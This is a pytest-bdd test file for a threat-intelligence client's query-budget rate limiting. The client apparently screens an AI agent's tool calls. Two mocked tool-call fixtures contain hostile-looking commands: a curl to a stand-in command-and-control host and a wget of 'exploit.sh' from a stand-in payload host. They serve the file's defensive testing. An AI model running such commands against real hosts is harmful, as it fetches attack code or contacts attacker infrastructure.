"""BDD Step definitions for GTI Query Budget Rate Limiting and Degradation."""

import asyncio
from unittest.mock import AsyncMock, MagicMock

import pytest
from pytest_bdd import given, scenarios, then, when

from blackwall.mcp.gti_client import (
    GTIBudgetExhaustedError,
    GTIMCPClient,
    GTIQueryBudgetTracker,
)
from blackwall.models import IndicatorType, ToolCallContext
from tests.step_defs.async_utils import run_async

scenarios("../features/gti_rate_limiting.feature")


class GTIState:
    def __init__(self):
        self.tracker = None
        self.client = None
        self.repo = None
        self.indicator = None
        self.indicator_type = None
        self.context = None
        self.query_result = None
        self.raised_error = None
        self.concurrent_results = []
        self.initial_tokens = 0


@pytest.fixture
def state():
    st = GTIState()
    yield st
    if st.tracker:
        try:
            st.tracker.close()
        except Exception:
            st.tracker._replenish_task = None


# --- Scenario: High-risk event consumes GTI token ---


@given("a GTI MCP Client with a full budget of 4 tokens")
def init_gti_client_full_budget(state):
    state.tracker = GTIQueryBudgetTracker(capacity=4, replenishment_interval=15.0)
    state.repo = MagicMock()
    state.repo.get_cached_gti_response = AsyncMock(return_value=None)
    state.repo.cache_gti_response = AsyncMock(return_value=None)
    state.client = GTIMCPClient(
        repo=state.repo,
        api_key="BW_SYNTHETIC_MOCK_SECRET_0192",
        budget_tracker=state.tracker,
    )
    # Mock live API query execution
    state.client._execute_api_query = AsyncMock(
        return_value={
            "indicator": "http://malicious-command-control.xyz",
            "is_malicious": True,
            "threat_categories": ["c2-node", "malware"],
            "detection_rate": 88.0,
            "last_analysis_date": "2026-08-23T00:00:00Z",
            "related_campaigns": ["campaign-red"],
            "confidence": 0.88,
        }
    )


@given(
    'an uncached high-risk indicator "http://malicious-command-control.xyz" with context "run_command"'
)
def set_high_risk_indicator_1(state):
    state.indicator = "http://malicious-command-control.xyz"
    state.indicator_type = IndicatorType.URL
    state.context = ToolCallContext(
        tool_name="run_command",
        arguments={"command": "curl http://malicious-command-control.xyz"},
    )


@when("the high-risk indicator is queried via GTI")
def query_high_risk_indicator(state):
    async def _query():
        return await state.client.queryIOC(
            indicator=state.indicator,
            indicator_type=state.indicator_type,
            context=state.context,
            skip_budget_check=False,
        )

    state.query_result = run_async(_query())


@then("exactly 1 GTI budget token is consumed")
def verify_token_consumed(state):
    async def _check():
        metrics = await state.tracker.get_metrics()
        return metrics.queries_executed

    executed = run_async(_check())
    assert executed == 1


@then("the available budget token count is 3")
def verify_token_count_3(state):
    async def _check():
        return await state.tracker.get_available_tokens()

    avail = run_async(_check())
    assert avail == 3


@then("the query executes successfully")
def verify_query_success(state):
    assert state.query_result is not None
    assert state.query_result.is_malicious is True
    assert state.query_result.detection_rate == 88.0


# --- Scenario: Budget exhaustion triggers graceful degradation ---


@given("a GTI MCP Client with an exhausted budget of 0 tokens")
def init_gti_client_exhausted(state):
    state.tracker = GTIQueryBudgetTracker(capacity=4, replenishment_interval=15.0)
    # Exhaust all 4 tokens
    async def _exhaust():
        for _ in range(4):
            await state.tracker.try_acquire()

    run_async(_exhaust())

    state.repo = MagicMock()
    state.repo.get_cached_gti_response = AsyncMock(return_value=None)
    state.repo.cache_gti_response = AsyncMock(return_value=None)
    state.client = GTIMCPClient(
        repo=state.repo,
        api_key="BW_SYNTHETIC_MOCK_SECRET_0192",
        budget_tracker=state.tracker,
    )
    state.client._execute_api_query = AsyncMock()


@given(
    'an uncached high-risk indicator "http://malicious-payload-drop.xyz" with context "run_command"'
)
def set_high_risk_indicator_2(state):
    state.indicator = "http://malicious-payload-drop.xyz"
    state.indicator_type = IndicatorType.URL
    state.context = ToolCallContext(
        tool_name="run_command",
        arguments={"command": "wget http://malicious-payload-drop.xyz/exploit.sh"},
    )


@when("the high-risk indicator is queried via GTI with budget enforcement")
def query_with_budget_enforcement(state):
    async def _query():
        try:
            return await state.client.queryIOC(
                indicator=state.indicator,
                indicator_type=state.indicator_type,
                context=state.context,
                skip_budget_check=False,
            )
        except Exception as e:
            state.raised_error = e

    state.query_result = run_async(_query())


@then("the GTI query raises GTIBudgetExhaustedError")
def verify_budget_exhausted_error(state):
    assert isinstance(state.raised_error, GTIBudgetExhaustedError)


@then("the budget metrics record 1 deferred query")
def verify_deferred_metric(state):
    async def _check():
        metrics = await state.tracker.get_metrics()
        return metrics.queries_deferred

    deferred = run_async(_check())
    assert deferred >= 1


# --- Scenario: Low-risk event skips GTI validation ---


@given('a low-risk indicator "127.0.0.1" with safe tool context "read_file"')
def set_low_risk_indicator(state):
    state.indicator = "127.0.0.1"
    state.indicator_type = IndicatorType.IP_ADDRESS
    state.context = ToolCallContext(
        tool_name="read_file",
        arguments={"path": "/var/log/app.log"},
    )


@when("the low-risk indicator is evaluated for GTI querying")
def evaluate_low_risk_indicator(state):
    async def _query():
        return await state.client.queryIOC(
            indicator=state.indicator,
            indicator_type=state.indicator_type,
            context=state.context,
            skip_budget_check=False,
        )

    state.query_result = run_async(_query())


@then("the GTI query is skipped without consuming a budget token")
def verify_query_skipped(state):
    assert state.query_result is not None
    assert state.query_result.is_malicious is False
    assert state.query_result.detection_rate == 0.0
    # _execute_api_query should not have been called
    state.client._execute_api_query.assert_not_called()


@then("the available budget token count remains 4")
def verify_available_tokens_remains_4(state):
    async def _check():
        return await state.tracker.get_available_tokens()

    avail = run_async(_check())
    assert avail == 4


# --- Scenario: Token replenishment restores capacity ---


@given(
    "a GTI query budget tracker with capacity 4 and fast replenishment interval 0.05 seconds"
)
def init_fast_tracker(state):
    state.tracker = GTIQueryBudgetTracker(capacity=4, replenishment_interval=0.05)


@given("all 4 tokens have been exhausted")
def exhaust_tracker_tokens(state):
    state.exhaust_needed = True


@when("the tracker waits for token replenishment")
def wait_for_replenishment(state):
    async def _exhaust_and_replenish():
        if getattr(state, "exhaust_needed", False):
            for _ in range(4):
                assert await state.tracker.try_acquire() is True
            assert await state.tracker.get_available_tokens() == 0
        # Wait for replenishment within active event loop
        await asyncio.sleep(0.12)

    run_async(_exhaust_and_replenish())


@then("the available token count increases above 0")
def verify_tokens_increased(state):
    async def _check():
        return await state.tracker.get_available_tokens()

    avail = run_async(_check())
    assert avail >= 1


@then("subsequent query acquisition succeeds")
def verify_subsequent_acquire(state):
    async def _check():
        return await state.tracker.try_acquire()

    acquired = run_async(_check())
    assert acquired is True


# --- Scenario: Concurrent events respect 4-query/60s cap ---


@given("a GTI query budget tracker with capacity 4")
def init_standard_tracker(state):
    # Long interval so no replenishment during test
    state.tracker = GTIQueryBudgetTracker(capacity=4, replenishment_interval=60.0)


@when("10 concurrent query acquisition requests are executed")
def execute_concurrent_acquisitions(state):
    async def _run_concurrent():
        tasks = [state.tracker.try_acquire() for _ in range(10)]
        return await asyncio.gather(*tasks)

    state.concurrent_results = run_async(_run_concurrent())


@then("exactly 4 requests are permitted")
def verify_4_permitted(state):
    permitted = sum(1 for r in state.concurrent_results if r is True)
    assert permitted == 4


@then("exactly 6 requests are deferred")
def verify_6_deferred(state):
    deferred = sum(1 for r in state.concurrent_results if r is False)
    assert deferred == 6


@then("the available token count is 0")
def verify_tokens_zero(state):
    async def _check():
        return await state.tracker.get_available_tokens()

    avail = run_async(_check())
    assert avail == 0
